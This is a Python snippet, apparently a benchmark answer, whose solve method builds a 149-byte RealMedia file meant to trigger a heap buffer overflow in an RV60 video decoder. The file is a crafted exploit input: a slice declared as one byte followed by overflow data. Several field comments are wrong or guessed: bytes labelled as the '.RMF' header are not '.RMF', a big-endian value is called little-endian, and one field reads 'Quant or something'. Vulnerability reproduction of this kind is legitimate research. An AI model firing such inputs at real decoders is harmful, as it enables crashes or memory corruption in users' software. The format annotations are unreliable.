class Solution:
    def solve(self, src_path: str) -> bytes:
        # Minimal PoC for heap buffer overflow in rv60dec
        # Crafted to trigger out-of-array access in slice gb
        poc = (
            b'\x00\x20\xBF'  # .RMF header (RealMedia File)
            b'\x00\x00\x00\x93'  # File size (little-endian, adjusted for 149 bytes total)
            b'\x00\x00'  # Version or padding
            b'PROP'  # Properties chunk
            b'\x00\x00\x00\x40'  # Chunk size
            b'\x00\x03'  # Object version
            b'\x00\x00\x00\x01'  # Length
            b'\x00\x00\x00\x00'  # Timestamp
            b'\x00\x00\x00\x00'  # Reserved
            b'\x00\x00\x00\x02'  # Stream count
            b'\x00\x00\x00\x00\x00\x00\x00\x00'  # Max bit rate
            b'\x00\x00\x00\x00\x00\x00\x00\x00'  # Avg bit rate
            b'\x00\x00\x00\x00\x00\x00\x00\x00'  # Max packet size
            b'\x00\x00\x00\x00\x00\x00\x00\x00'  # Avg packet size
            b'\x00\x00\x00\x00\x00\x00\x00\x00'  # Num packets
            b'\x00\x00\x00\x00\x00\x00\x00\x00'  # Duration
            b'\x00\x00\x00\x00'  # Preroll
            b'\x00\x00\x00\x00'  # Index offset
            b'\x00\x00\x00\x00'  # Data offset
            b'\x00\x00\x00\x01'  # Num streams
            b'\x00\x00'  # Flags
            b'MDPR'  # Media Properties chunk
            b'\x00\x00\x00\x30'  # Chunk size
            b'\x00\x02'  # Object version
            b'\x00\x00\x00\x01'  # Length
            b'\x00\x00\x00\x00'  # Timestamp
            b'\x00\x00\x00\x00'  # Reserved
            b'\x00\x00\x00\x01'  # Stream number
            b'\x00\x00\x00\x00'  # Average bit rate
            b'\x00\x00\x00\x00'  # Max bit rate
            b'\x00\x00\x00\x00'  # Average packet size
            b'\x00\x00\x00\x00'  # Max packet size
            b'\x00\x00\x00\x00'  # Starting time
            b'\x00\x00\x00\x00'  # Preroll
            b'\x00\x00\x00\x00'  # Duration
            b'\x52\x56\x36\x30'  # 'RV60' codec id
            b'\x00\x00\x00\x00\x00\x00\x00\x00'  # MIME type length 0
            b'\x00\x00\x00\x00\x00\x00\x00\x00'  # File name length 0
            b'CONT'  # Content chunk (short)
            b'\x00\x00\x00\x08'  # Chunk size
            b'\x00\x01'  # Object version
            b'\x00\x00\x00\x01'  # Length
            b'\x00\x00\x00\x00'  # Timestamp
            b'\x00\x00\x00\x00'  # Reserved
            b'Title'  # Title (short)
            b'DATA'  # Data chunk
            b'\x00\x00\x00\x10'  # Chunk size (small to trigger overflow)
            b'\x00\x01'  # Object version
            b'\x00\x00\x00\x01'  # Length
            b'\x00\x00\x00\x00'  # Timestamp
            b'\x00\x00\x00\x00'  # Reserved
            # Video packet: small header, large implied data to overflow
            b'\x00\x00\x00\x01'  # Substream ID or frame type
            b'\x41'  # Picture start code for RV
            b'\x00'  # Subversion or flags
            b'\x00\x00'  # Temporal ref
            b'\x01'  # Quant or something
            b'\x80'  # Width/height implied small
            b'\x80'
            b'\x00\x00'  # Padding to reach slice decode
            # Slice data: short buffer but read more
            b'\x00\x01'  # Slice count 1
            b'\x00\x00\x00\x01'  # Small slice size (1 byte allocated)
            b'\xff' * 20  # Overflow data to cause read beyond
            b'\x00' * (149 - 140)  # Pad to exactly 149 bytes
        )
        assert len(poc) == 149
        return poc